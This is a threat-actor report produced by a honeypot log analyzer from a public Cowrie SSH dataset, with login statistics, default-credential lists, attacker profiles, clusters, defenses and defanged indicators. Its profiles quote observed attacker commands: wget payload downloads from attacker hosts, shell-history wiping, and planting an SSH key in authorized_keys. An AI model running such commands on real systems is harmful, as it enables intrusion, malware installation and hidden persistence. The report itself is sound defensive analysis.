@@ -1,0 +1,424 @@
+====================================================================================================
+                         THREAT ACTOR PROFILE  -  SSH HONEYPOT LOG ANALYSIS                         
+====================================================================================================
+  Generated      : 2026-09-22 18:15:44 (local)
+  Source log     : evidence/sample_data.txt
+  Analyzer       : honeypot_analyzer.py v1.0
+  Dataset        : CyberLab honeynet dataset, Cowrie SSH honeypot, 2019-05-18 (CC BY 4.0)
+                   doi:10.5281/zenodo.3687527 - source IPs are pseudonymized by the dataset
+  Classification : TLP:CLEAR
+
+[1] EXECUTIVE SUMMARY
+----------------------------------------------------------------------------------------------------
+  Log lines read ............ 34,772  (parsed 34,772 | ignored 0 | malformed 0)
+  Observation window ........ 2019-05-18 00:00:16 -> 2019-05-19 01:51:03 UTC (25.8 h)
+  SSH sessions .............. 7,465
+  Unique source IPs ......... 180  (148 tried to log in)
+  Login attempts ............ 7,077  (failed 2,023 | accepted by honeypot 5,054)
+  Unique usernames/passwords  190 / 284
+  Post-login commands ....... 326
+  Malware downloads ......... 29  (3 unique URLs)
+  SSH tunnel requests ....... 7,056
+  Behaviour mix (IPs) ....... OPPORTUNISTIC SCANNER: 124 | IoT DEFAULT-CREDENTIAL BOTNET: 39 | SSH
+                              TUNNEL / PROXY ABUSE: 22 | BACKDOOR / PERSISTENCE: 10 | MALWARE
+                              DROPPER: 3 | BRUTE FORCE: 1
+
+  Key findings
+   * One source (c360572c07b8ca33, Unknown) produced 26.7% of all login attempts (1,888 tries).
+   * 'root' was the most-tried username (71.6%); 'admin' the most-tried password; top pair
+     root/admin x5,009.
+   * 10 IP(s) planted SSH keys / cron jobs for persistent access after disabling shell history.
+   * 73.9% of attempts used known IoT/vendor default credentials (the lists Mirai-family bots
+     use).
+   * 22 IPs used the honeypot as an SSH proxy (7,056 tunnel requests, 80.2% to SMTP ports -> spam
+     relaying).
+   * 3 IP(s) logged in and pulled malware from 3 URL(s) - see IOC list.
+   * Dominant client banner 'SSH-2.0-Go' (93.8% of sessions that sent one) points to automated Go-
+     based tooling, not humans.
+
+[2] TOP 10 ATTACKING IPs (by login attempts)
+----------------------------------------------------------------------------------------------------
+  #   Source IP (pseudonym)  Country  Tries   Share  Sess  Users   OK  First  Last   Behaviour
+  --  ---------------------  -------  -----  ------  ----  -----  ---  -----  -----  -----------------
+  1   c360572c07b8ca33       Unknown  1,888   26.7%   146     93    6  00:48  21:36  BRUTE
+  2   ad4147acf400d97f       Ireland    343    4.8%   481      1  343  00:00  23:59  IOT-DEFAULT
+  3   a9741bbf12091b07       Ireland    335    4.7%   471      1  335  00:00  23:24  IOT-DEFAULT+PROXY
+  4   ba3a5c03d36d3ad5       Czechia    282    4.0%   403      1  282  07:07  23:59  IOT-DEFAULT+PROXY
+  5   65b8cb085ad96326       Czechia    247    3.5%   349      1  247  02:37  23:10  IOT-DEFAULT+PROXY
+  6   f6f77dc3a17e2909       Ireland    238    3.4%   347      1  238  00:00  22:56  IOT-DEFAULT+PROXY
+  7   d7554d256b3d7a23       Russia     234    3.3%   321      1  234  00:00  23:59  IOT-DEFAULT+PROXY
+  8   61462fead4a190e6       Russia     223    3.2%   307      1  223  04:06  20:41  IOT-DEFAULT+PROXY
+  9   f4b8594c7b652ca5       Ireland    222    3.1%   317      1  222  00:00  20:39  IOT-DEFAULT
+  10  045e566170e3525c       Czechia    221    3.1%   309      1  221  00:00  22:26  IOT-DEFAULT+PROXY
+
+[3] CREDENTIAL INTELLIGENCE
+----------------------------------------------------------------------------------------------------
+  Most-tried USERNAMES (top 10)
+  #   Username       Count   Share
+  --  -------------  -----  ------  ------------------------
+  1   root           5,064   71.6%  ########################
+  2   admin            680    9.6%  ###
+  3   adm               72    1.0%  #
+  4   guest             64    0.9%  #
+  5   ftp               63    0.9%  #
+  6   operator          53    0.7%  #
+  7   default           52    0.7%  #
+  8   ftpuser           51    0.7%  #
+  9   nagios            49    0.7%  #
+  10  administrator     43    0.6%  #
+
+  Most-tried PASSWORDS (top 10)
+  #   Password   Count   Share
+  --  ---------  -----  ------  ------------------------
+  1   admin      5,068   71.6%  ########################
+  2   <empty>      134    1.9%  #
+  3   123456        51    0.7%  #
+  4   12345         49    0.7%  #
+  5   manager       33    0.5%  #
+  6   111111        32    0.5%  #
+  7   987654321     30    0.4%  #
+  8   ubnt          29    0.4%  #
+  9   1234          28    0.4%  #
+  10  uucp          27    0.4%  #
+
+  Most-tried USERNAME/PASSWORD PAIRS (top 10)
+  #   Credential pair     Count   Share
+  --  ------------------  -----  ------  ------------------------
+  1   root/admin          5,009   70.8%  ########################
+  2   admin/7ujMko0admin     15    0.2%  #
+  3   admin/1111             12    0.2%  #
+  4   admin/manager          12    0.2%  #
+  5   admin/changeme         12    0.2%  #
+  6   admin/admin1           12    0.2%  #
+  7   admin/admin1234        12    0.2%  #
+  8   111111/admin           11    0.2%  #
+  9   admin/admin            11    0.2%  #
+  10  adm/12345678           10    0.1%  #
+
+  SSH client banners
+  #  Client version              Count   Share
+  -  --------------------------  -----  ------  ------------------------
+  1  SSH-2.0-Go                  5,022   93.8%  ########################
+  2  SSH-2.0-libssh2_1.8.2         116    2.2%  #
+  3  SSH-2.0-PUTTY                  35    0.7%  #
+  4  SSH-2.0-libssh2_1.4.2          27    0.5%  #
+  5  SSH-2.0-libssh-0.1             23    0.4%  #
+  6  SSH-2.0-PuTTY_Release_0.63     10    0.2%  #
+
+  Login attempts by source country (dataset geolocation)
+  #  Country        Count   Share
+  -  -------------  -----  ------  ------------------------
+  1  Ireland        2,774   39.2%  ########################
+  2  Unknown        2,007   28.4%  #################
+  3  Russia           941   13.3%  ########
+  4  Czechia          883   12.5%  ########
+  5  Netherlands      284    4.0%  ##
+  6  United States     65    0.9%  #
+  7  Canada            21    0.3%  #
+  8  China             15    0.2%  #
+
+
+[4] THREAT ACTOR PROFILES (highest risk first)
+----------------------------------------------------------------------------------------------------
+  One exemplar per behaviour class and the top talker, then the next highest-risk sources
+  (max two per identical behaviour pattern; look-alikes are summarised in section [5]).
+
+  +-- TA-01  a1d493f45b7c8fd4  (United States) -------------------------------- CRITICAL  71/100 --+
+  |  Behaviour      : MALWARE DROPPER
+  |  Activity       : 27 sessions, 27 login attempts (0.4% of all), 08:31 -> 22:55 UTC
+  |  Tempo          : 0.03 attempts/min over 863 min
+  |  Top usernames  : root(27)
+  |  Top passwords  : toor(3), admin123(3), mustang(3), manager(3), changeme(3)
+  |  Default creds  : 0.0% of attempts used IoT/vendor defaults
+  |  Honeypot login : 27 accepted, first 08:31:50 as root/toor
+  |  Client         : SSH-2.0-libssh2_1.4.2(27)
+  |  Commands       : 162 run, 6 unique:
+  |                   $ cd /tmp
+  |                   $ cd /var/run
+  |                   $ cd /mnt
+  |                   $ cd /root
+  |                   $ cd /
+  |                   $ wget hxxp://102.165.48[.]81/njs.sh
+  |  Payload        : hxxp://102.165.48[.]81/njs.sh  sha256:4d5d466c37e5e9a7...
+  |  MITRE ATT&CK   : 
+  |                   T1078      Valid Accounts
+  |                   T1105      Ingress Tool Transfer
+  |  Assessment     : Automated intrusion: logged in, fetched a payload - a typical Linux bot
+  |                   infection chain.
+  +------------------------------------------------------------------------------------------------+
+
+  +-- TA-02  97b2737d3c1ddd6b  (United States) -------------------------------- CRITICAL  70/100 --+
+  |  Behaviour      : MALWARE DROPPER
+  |  Activity       : 4 sessions, 1 login attempts (0.0% of all), 05:45 -> 05:45 UTC
+  |  Tempo          : 1.00 attempts/min over 0 min
+  |  Top usernames  : root(1)
+  |  Top passwords  : 000000(1)
+  |  Default creds  : 0.0% of attempts used IoT/vendor defaults
+  |  Honeypot login : 1 accepted, first 05:45:38 as root/000000
+  |  Client         : SSH-2.0-PUTTY(1)
+  |  Commands       : 2 run, 2 unique:
+  |                   $ wget hxxp://192.200.208[.]181/mi3307 curl -O hxxp://192.200.208[.]181/mi3307
+  |                   $ ls -la /var/run/gcc.pid
+  |  Payload        : hxxp://192.200.208[.]181/mi3307  sha256:90ad1f172af7d091...
+  |  MITRE ATT&CK   : 
+  |                   T1078      Valid Accounts
+  |                   T1105      Ingress Tool Transfer
+  |                   T1059.004  Command and Scripting Interpreter: Unix Shell
+  |  Assessment     : Automated intrusion: logged in, fetched a payload and executed it - a typical
+  |                   Linux bot infection chain.
+  +------------------------------------------------------------------------------------------------+
+
+  +-- TA-03  a9741bbf12091b07  (Ireland) ------------------------------------------ HIGH  67/100 --+
+  |  Behaviour      : IoT DEFAULT-CREDENTIAL BOTNET, SSH TUNNEL / PROXY ABUSE
+  |  Activity       : 471 sessions, 335 login attempts (4.7% of all), 00:00 -> 23:24 UTC
+  |  Tempo          : 0.24 attempts/min over 1,403 min
+  |  Top usernames  : root(335)
+  |  Top passwords  : admin(335)
+  |  Default creds  : 100.0% of attempts used IoT/vendor defaults
+  |  Honeypot login : 335 accepted, first 00:00:55 as root/admin
+  |  Client         : SSH-2.0-Go(335)
+  |  Tunnels        : 1,293 requests to 424 destination(s); ports 25(1293)
+  |  MITRE ATT&CK   : 
+  |                   T1110.004  Brute Force: Credential Stuffing (default-credential list)
+  |                   T1078.001  Valid Accounts: Default Accounts
+  |                   T1090      Proxy (SSH direct-tcpip port forwarding)
+  |                   T1583.006* Abuse of third-party infrastructure for spam relay (SMTP)
+  |  Assessment     : Logs in with a known default credential and tunnels traffic through the host -
+  |                   outbound spam relay; credentials come from public IoT/vendor default lists.
+  +------------------------------------------------------------------------------------------------+
+
+  +-- TA-04  f6f77dc3a17e2909  (Ireland) ------------------------------------------ HIGH  62/100 --+
+  |  Behaviour      : IoT DEFAULT-CREDENTIAL BOTNET, SSH TUNNEL / PROXY ABUSE
+  |  Activity       : 347 sessions, 238 login attempts (3.4% of all), 00:00 -> 22:57 UTC
+  |  Tempo          : 0.17 attempts/min over 1,376 min
+  |  Top usernames  : root(238)
+  |  Top passwords  : admin(238)
+  |  Default creds  : 100.0% of attempts used IoT/vendor defaults
+  |  Honeypot login : 238 accepted, first 00:00:20 as root/admin
+  |  Client         : SSH-2.0-Go(240)
+  |  Tunnels        : 1,002 requests to 339 destination(s); ports 25(1002)
+  |  MITRE ATT&CK   : 
+  |                   T1110.004  Brute Force: Credential Stuffing (default-credential list)
+  |                   T1078.001  Valid Accounts: Default Accounts
+  |                   T1090      Proxy (SSH direct-tcpip port forwarding)
+  |                   T1583.006* Abuse of third-party infrastructure for spam relay (SMTP)
+  |  Assessment     : Logs in with a known default credential and tunnels traffic through the host -
+  |                   outbound spam relay; credentials come from public IoT/vendor default lists.
+  +------------------------------------------------------------------------------------------------+
+
+  +-- TA-05  d2482e6226e68768  (Poland) ------------------------------------------- HIGH  60/100 --+
+  |  Behaviour      : BACKDOOR / PERSISTENCE
+  |  Activity       : 2 sessions, 2 login attempts (0.0% of all), 03:13 -> 03:52 UTC
+  |  Tempo          : 0.05 attempts/min over 39 min
+  |  Top usernames  : root(1), todds(1)
+  |  Top passwords  : nevergetroot(1), 123456(1)
+  |  Default creds  : 0.0% of attempts used IoT/vendor defaults
+  |  Honeypot login : 1 accepted, first 03:13:09 as root/nevergetroot
+  |  Client         : SSH-2.0-libssh2_1.8.2(2)
+  |  Commands       : 12 run, 11 unique:
+  |                   $ uname -a
+  |                   $ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
+  |                   $ history -n
+  |                   $ export HISTFILE=/dev/null
+  |                   $ export HISTSIZE=0
+  |                   $ export HISTFILESIZE=0
+  |                   $ cd
+  |                   $ mkdir /root/.ssh
+  |                   $ rm -rf .ssh/authorized_keys
+  |                   $ touch .ssh/authorized_keys
+  |                   $ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddO
+  |  MITRE ATT&CK   : 
+  |                   T1078      Valid Accounts
+  |                   T1070.003  Indicator Removal: Clear Command History
+  |                   T1082      System Information Discovery
+  |                   T1098.004  Account Manipulation: SSH Authorized Keys
+  |  Assessment     : Backdoor installation: logged in, fingerprinted the system, disabled shell
+  |                   history, planted an attacker SSH key / cron job for persistent access.
+  +------------------------------------------------------------------------------------------------+
+
+  +-- TA-06  b9543c359ada5076  (France) ------------------------------------------- HIGH  60/100 --+
+  |  Behaviour      : BACKDOOR / PERSISTENCE
+  |  Activity       : 1 sessions, 1 login attempts (0.0% of all), 00:41 -> 00:41 UTC
+  |  Tempo          : 1.00 attempts/min over 0 min
+  |  Top usernames  : root(1)
+  |  Top passwords  : 1q2w3e4r(1)
+  |  Default creds  : 0.0% of attempts used IoT/vendor defaults
+  |  Honeypot login : 1 accepted, first 00:41:09 as root/1q2w3e4r
+  |  Client         : SSH-2.0-libssh2_1.8.2(1)
+  |  Commands       : 12 run, 11 unique:
+  |                   $ uname -a
+  |                   $ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
+  |                   $ history -n
+  |                   $ export HISTFILE=/dev/null
+  |                   $ export HISTSIZE=0
+  |                   $ export HISTFILESIZE=0
+  |                   $ cd
+  |                   $ mkdir /root/.ssh
+  |                   $ rm -rf .ssh/authorized_keys
+  |                   $ touch .ssh/authorized_keys
+  |                   $ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddO
+  |  MITRE ATT&CK   : 
+  |                   T1078      Valid Accounts
+  |                   T1070.003  Indicator Removal: Clear Command History
+  |                   T1082      System Information Discovery
+  |                   T1098.004  Account Manipulation: SSH Authorized Keys
+  |  Assessment     : Backdoor installation: logged in, fingerprinted the system, disabled shell
+  |                   history, planted an attacker SSH key / cron job for persistent access.
+  +------------------------------------------------------------------------------------------------+
+
+  +-- TA-07  c360572c07b8ca33  (Unknown) ---------------------------------------- MEDIUM  45/100 --+
+  |  Behaviour      : BRUTE FORCE
+  |  Activity       : 146 sessions, 1,888 login attempts (26.7% of all), 00:48 -> 21:36 UTC
+  |  Tempo          : 1.51 attempts/min over 1,248 min
+  |  Top usernames  : admin(670), adm(72), guest(63), ftp(62), default(52)
+  |  Top passwords  : <empty>(133), admin(60), 12345(49), 123456(42), manager(30)
+  |  Default creds  : 10.6% of attempts used IoT/vendor defaults
+  |  Honeypot login : 6 accepted, first 00:57:05 as root/admin
+  |  Client         : SSH-2.0-PuTTY_Release_0.59(5), SSH-2.0-libssh_0.11(4)
+  |  MITRE ATT&CK   : 
+  |                   T1110.001  Brute Force: Password Guessing
+  |                   T1078.001  Valid Accounts: Default Accounts
+  |  Assessment     : High-volume credential guessing (1,888 tries).
+  +------------------------------------------------------------------------------------------------+
+
+  +-- TA-08  b2b173f452d7be48  (Poland) ----------------------------------------- MEDIUM  45/100 --+
+  |  Behaviour      : SSH TUNNEL / PROXY ABUSE
+  |  Activity       : 1 sessions, 1 login attempts (0.0% of all), 09:43 -> 09:47 UTC
+  |  Tempo          : 1.00 attempts/min over 0 min
+  |  Top usernames  : root(1)
+  |  Top passwords  : 111111(1)
+  |  Default creds  : 0.0% of attempts used IoT/vendor defaults
+  |  Honeypot login : 1 accepted, first 09:43:33 as root/111111
+  |  Client         : SSH-2.0-sshlib-0.1(1)
+  |  Tunnels        : 1 requests to 1 destination(s); ports 443(1)
+  |  Commands       : 40 run, 33 unique:
+  |                   $ /gisdfoewrsfdf
+  |                   $ sudo /bin/sh
+  |                   $ /bin/sh
+  |                   $ /bin/busybox cp
+  |                   $ mount
+  |                   $ echo -e '\x47\x72\x6f\x70/' > //.nippon
+  |                   $ cat //.nippon
+  |                   $ rm -f //.nippon
+  |                   $ echo -e '\x47\x72\x6f\x70/tmp' > /tmp/.nippon
+  |                   $ cat /tmp/.nippon
+  |                   $ rm -f /tmp/.nippon
+  |                   $ echo -e '\x47\x72\x6f\x70/var/tmp' > /var/tmp/.nippon
+  |  MITRE ATT&CK   : 
+  |                   T1078      Valid Accounts
+  |                   T1090      Proxy (SSH direct-tcpip port forwarding)
+  |  Assessment     : Logs in with an accepted credential and tunnels traffic through the host -
+  |                   anonymising web proxy.
+  +------------------------------------------------------------------------------------------------+
+
+  Not profiled individually: 172 sources, 4,584 attempts (behaviour: SCANNER 124, IOT-DEFAULT 37,
+  PROXY 19, PERSIST 8, DROPPER 1). Most belong to the clusters in section [5].
+
+[5] CAMPAIGN / INFRASTRUCTURE CLUSTERS
+----------------------------------------------------------------------------------------------------
+  IPs grouped by shared artefacts. Pseudonymized IPs rule out /24 grouping,
+  so clustering uses behaviour: same payload hash, same command script, same exact
+  credential list, same tunnel ports.
+
+  C-01  Identical credential list: 1 cred(s) [root/admin] via SSH-2.0-Go
+        36 IPs, 4,990 login attempts, 7,033 sessions, countries: Ireland, Russia, Czechia, Unknown
+        members: ad4147acf400d97f, a9741bbf12091b07, ba3a5c03d36d3ad5, 65b8cb085ad96326, f6f77dc3a17e2909 ...
+  C-02  Same tunnel target ports: dst ports 443
+        7 IPs, 1,208 login attempts, 1,714 sessions, countries: Ireland, Czechia, Poland
+        members: ba3a5c03d36d3ad5, 65b8cb085ad96326, 2249962791c288cf, a5530362777f4097, 7a91735d3896b1f2 ...
+  C-03  Same tunnel target ports: dst ports 25
+        4 IPs, 951 login attempts, 1,336 sessions, countries: Ireland, Netherlands
+        members: a9741bbf12091b07, f6f77dc3a17e2909, 65d0450526db8654, 00a59ce4892d5315
+  C-04  Same tunnel target ports: dst ports 25,80,465,587
+        3 IPs, 571 login attempts, 793 sessions, countries: Russia
+        members: d7554d256b3d7a23, d4f3841f76624b67, 899a269b9683a9bd
+  C-05  Same tunnel target ports: dst ports 80
+        3 IPs, 125 login attempts, 157 sessions, countries: Netherlands, Latvia, Czechia
+        members: 85a32508793c4a84, 264e3b1322758146, 360ddec1dbfd36ae
+  C-06  Malware payload: sha256:4d5d466c37e5e9a7... served from 1 URL(s): hxxp://102.165.48[.]81/njs.sh
+        1 IPs, 27 login attempts, 27 sessions, countries: United States
+        members: a1d493f45b7c8fd4
+  C-07  Identical post-login script: 11 commands, starts 'uname -a'
+        10 IPs, 11 login attempts, 11 sessions, countries: United States, Mauritius, Canada, France
+        members: d2482e6226e68768, ed007a116f83a834, eb6b0ff9c72fb610, 720917c2882599d8, 5c2ce119cb702899 ...
+  C-08  Malware payload: sha256:90ad1f172af7d091... served from 2 URL(s): hxxp://107.160.40[.]212/mi3307, hxxp://192.200.208[.]181/mi3307
+        2 IPs, 2 login attempts, 5 sessions, countries: United States
+        members: ec43dfb3fca33a62, 97b2737d3c1ddd6b
+
+[6] TIMELINE - login attempts per hour (UTC)
+----------------------------------------------------------------------------------------------------
+  Hour   Logins  Tunnels
+  00:00     549      181  ################################################
+  01:00     253      283  ######################
+  02:00     222      260  ###################
+  03:00     200      416  #################
+  04:00     489      345  ###########################################
+  05:00     333      186  #############################
+  06:00     229      180  ####################
+  07:00     216      149  ###################
+  08:00     251      142  ######################
+  09:00     540      332  ###############################################
+  10:00     243      269  #####################
+  11:00      73       23  ######
+  12:00     115      115  ##########
+  13:00     513      968  #############################################
+  14:00     200      553  #################
+  15:00     187      100  ################
+  16:00     216      128  ###################
+  17:00     543      300  ###############################################
+  18:00     220      527  ###################
+  19:00     224      449  ###################
+  20:00     248      411  ######################
+  21:00     575      369  ##################################################
+  22:00     240      291  #####################
+  23:00     198       79  #################
+  Peak hour 21:00 UTC with 575 attempts.
+
+[7] DEFENSIVE RECOMMENDATIONS
+----------------------------------------------------------------------------------------------------
+  1. Disable SSH password authentication (PasswordAuthentication no); use keys + MFA.
+  2. Never ship default credentials - 73.9% of attempts here used them. Force a password change on
+     first boot for IoT/embedded devices.
+  3. Block or rename 'root' logins (PermitRootLogin no) - it was the #1 target.
+  4. Rate-limit and auto-ban repeat offenders (fail2ban / sshguard; e.g. 5 failures -> 1 h ban).
+  5. Disable TCP forwarding for untrusted users (AllowTcpForwarding no) to stop proxy/spam abuse.
+  6. Egress-filter outbound SMTP (25/465/587) from servers that do not send mail.
+  7. Feed the IOC list below into firewall / proxy / EDR blocklists and hunt for the file hashes.
+  8. Alert on post-login discovery + history wiping (uname, unset HISTFILE) - strong intrusion
+     signals.
+
+[8] INDICATORS OF COMPROMISE (defanged)
+----------------------------------------------------------------------------------------------------
+  Malware download URLs and SHA-256 hashes:
+    hxxp://102.165.48[.]81/njs.sh          sha256:4d5d466c37e5e9a7a3c306192bdbcdf66b511525e578ebb76bac817eb086f90c  (27 downloads)
+    hxxp://192.200.208[.]181/mi3307        sha256:90ad1f172af7d0915e548bd84443ab3cc3b3df97b3fbf8c06ecc8b42604fbb5f  (1 download)
+    hxxp://107.160.40[.]212/mi3307         sha256:90ad1f172af7d0915e548bd84443ab3cc3b3df97b3fbf8c06ecc8b42604fbb5f  (1 download)
+
+  Attacker SSH public keys planted in authorized_keys (hunt for these on your hosts):
+    ssh-rsa SHA256:DO581XF77zlDh2RnrMN6UQPGK6eiBpy0bBYVZu9NYOA  comment '-'  (10 source IPs)
+
+  Source IP pseudonyms rated HIGH/CRITICAL (map back to real IPs with the dataset owner):
+    a1d493f45b7c8fd4 (C)   97b2737d3c1ddd6b (C)   ec43dfb3fca33a62 (C)   a9741bbf12091b07 (H)
+    f6f77dc3a17e2909 (H)   d7554d256b3d7a23 (H)   61462fead4a190e6 (H)   d4f3841f76624b67 (H)
+    65d0450526db8654 (H)   d2482e6226e68768 (H)   b9543c359ada5076 (H)   9d88926bcf976ce5 (H)
+    eb6b0ff9c72fb610 (H)   5c2ce119cb702899 (H)   7b055aa9b290ea41 (H)   6d37ca1f370b0b6e (H)
+    93c0b3c95bcb114f (H)   ed007a116f83a834 (H)   720917c2882599d8 (H)   ba3a5c03d36d3ad5 (H)
+    00a59ce4892d5315 (H)   65b8cb085ad96326 (H)   899a269b9683a9bd (H)   045e566170e3525c (H)
+    2249962791c288cf (H)   a5530362777f4097 (H)   7a91735d3896b1f2 (H)   5347e48dd3343aa5 (H)
+    6f6e31e813d4f8f0 (H)   85a32508793c4a84 (H)   608c5c756fc0822e (H)
+
+METHODOLOGY
+----------------------------------------------------------------------------------------------------
+  Brute force  : >= 10 distinct credential pairs AND (>= 100 attempts,
+                 or >= 20 attempts at >= 5/min).
+  IoT botnet   : >= 5 attempts, >= 50% of them known default credential pairs.
+  Proxy abuse  : any cowrie.direct-tcpip.request (attacker tunnels traffic through the honeypot).
+  Dropper      : a file download or wget/curl/tftp command after login.
+  Persistence  : writes ~/.ssh/authorized_keys or cron entries after login.
+  Risk score   : volume (<=25) + brute 15 + botnet 10 + post-auth activity 20 + tunnel 15
+                 + SMTP 5 + commands 10 + download 40 + anti-forensics 5
+                 + persistence 25, capped at 100.
+                 >=70 CRITICAL, >=50 HIGH, >=30 MEDIUM, else LOW.
+  Note         : a honeypot 'accepts' logins on purpose; 'OK' means the attacker got a fake shell.
+  (*) T1583.006 is the closest ATT&CK fit for spam relaying; no exact technique exists.
+====================================================================================================
